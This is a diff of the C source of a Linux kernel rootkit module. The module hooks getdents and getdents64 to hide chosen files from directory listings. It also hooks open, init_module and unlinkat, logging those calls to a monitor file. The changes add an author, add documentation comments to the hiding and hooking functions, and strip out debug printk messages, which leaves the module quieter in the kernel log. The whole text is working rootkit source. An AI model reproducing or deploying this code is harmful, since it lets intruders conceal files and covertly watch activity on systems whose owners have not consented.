@@ -12,7 +12,7 @@
 
 /*************** Module description ********************/
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Xincheng Yang");
+MODULE_AUTHOR("Xincheng Yang and Matthew hammond");
 MODULE_DESCRIPTION("Rootkit main entry"); 
 
 /*************** Methods declaration ********************/
@@ -55,6 +55,7 @@ int moni_open;
 int moni_unlink;
 int moni_init_module;
 
+/*************** Struct ********************/
 struct linux_dirent {
    long           d_ino;
    off_t          d_off;
@@ -151,6 +152,13 @@ static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long c
     return count;
 }
 
+/**
+ * @brief Hide a specified file use linux_dirent
+ * @param f_name : the file we want to hide 
+ * @param dirp : the structure dirent which point to a specified file(inode) 
+ * @param count : the size of this structure
+ * @return 
+ */
 static long hide_file(char *f_name, struct linux_dirent __user *dirp, long count)
 {
     struct linux_dirent *dp;
@@ -192,6 +200,12 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
     return rv;
 }
 
+/**
+ * @brief A hooked getdents64 for hide the file from filesystem
+ * @param fd
+ * @param count
+ * @return 
+ */
 asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
     long rv;
@@ -206,6 +220,10 @@ asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent __user *dir
     return rv;
 }
 
+/**
+ * @brief A hooked open for filesystem
+ * @return 
+ */
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode){
     if(moni_open && strncmp(filename, workdir, strlen(workdir)) != 0){
         callMonitor("open", filename);
@@ -214,6 +232,10 @@ asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode
     return kernel_open(filename, flags, mode);
 }
 
+/**
+ * @brief A hooked init module
+ * @return 
+ */
 asmlinkage long hooked_init_module(void __user *  umod,  unsigned long len, 
                                               const char __user * uargs){
     if(moni_init_module){
@@ -223,6 +245,10 @@ asmlinkage long hooked_init_module(void __user *  umod,  unsigned long len,
     return kernel_init_module(umod, len, uargs);
 }
 
+/**
+ * @brief A hooked unlinkat (command 'rm')
+ * @return 
+ */
 asmlinkage long hooked_unlinkat(int dfd, const char __user * pathname, int flag){
     if(moni_unlink){
         callMonitor("unlink", pathname);
@@ -326,7 +352,6 @@ static void lkm_exit(void)
 
 static int callMonitor(char *type, const char *msg){
     if(monitor == NULL) return -1;
-    printk("call = [%s] [%s] [%s]\n", type, msg, monitor+1);
     char m[256] = "";
     
     mm_segment_t old_fs;
@@ -342,7 +367,6 @@ static int callMonitor(char *type, const char *msg){
     
     f = filp_open(monitor, O_RDWR|O_LARGEFILE|O_CREAT|O_APPEND, 0666);
     if (IS_ERR(f)) {
-        printk("error occured while opening file exiting...\n");
         return 0;
     }
     
@@ -360,7 +384,7 @@ static int callMonitor(char *type, const char *msg){
 
 static int configMonitor(char *msg){
     while(*msg == ' ') msg++;
-    printk("config = [%s]\n", msg);
+    
     if(strncmp(msg, "set", 3) == 0){
         msg += 4;
         workdir = (char*) vmalloc(strlen(msg) + 1);
